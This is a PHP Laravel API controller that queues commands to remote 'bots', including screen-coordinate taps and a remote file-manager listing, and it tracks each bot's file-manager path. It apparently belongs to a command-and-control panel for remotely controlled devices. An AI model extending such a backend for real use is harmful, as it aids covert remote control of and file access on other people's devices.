<?php

namespace App\Http\Controllers\Api\v1\Bot;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Http\Resources\BotCommand\BotCommandCollection;
use App\Models\Bot;
use App\Models\BotCommand;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

class BotCommandController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function index(Bot $bot, Request $request): JsonResponse
    {
        $this->validate($request, [
            'per_page' => 'integer',
            'page' => 'integer',
        ]);

        $botCommands = BotCommand::where('bot_id', $bot->id)
            ->select('bot_commands.*')
            ->join('bots', 'bots.id', '=', 'bot_commands.bot_id');

        /** @var User $user */
        $user = auth()->user();

        if (count($user->tagsNames)) {
            $botCommands = $botCommands->whereIn('bots.tag', $user->tagsNames);
        }

        $botCommands = $botCommands->orderByDesc('id')
            ->paginate($request->get('per_page', 5));

        return BotCommandCollection::make($botCommands)->response();
    }

    /**
     * @throws ValidationException
     */
    public function store(Request $request): ApiResponse
    {
        $this->validate($request, [
            'command' => 'required|string',
            'payload' => 'array',
            'botIds' => 'array|min:1',
            'botIds.*' => 'string|exists:bots,id',
        ]);

        $botIds = collect($request->get('botIds'))->unique();

        foreach ($botIds as $botId) {
            $payload = $request->get('payload', []);

            if ($payload === []) {
                $payload = "{}";
            }

            if (isset($payload['x'])) {
                $payload['x'] = (int)$payload['x'];
            }

            if (isset($payload['y'])) {
                $payload['y'] = (int)$payload['y'];
            }

            $command = [
                'command' => $request->get('command'),
                'payload' => $payload,
            ];

            BotCommand::create([
                'bot_id' => $botId,
                'command' => $command,
                'is_processed' => false,
                'run_at' => Carbon::now(),
            ]);

            if (
                $request->get('command') === 'fmmanager'
                && isset($payload['extra'], $payload['path'])
                && $payload['extra'] === 'ls'
            ) {
                // TODO event
                Bot::whereId($botId)->update([
                    'current_file_manager_path' => $payload['path'],
                ]);
            }
        }

        return ApiResponse::success();
    }
}
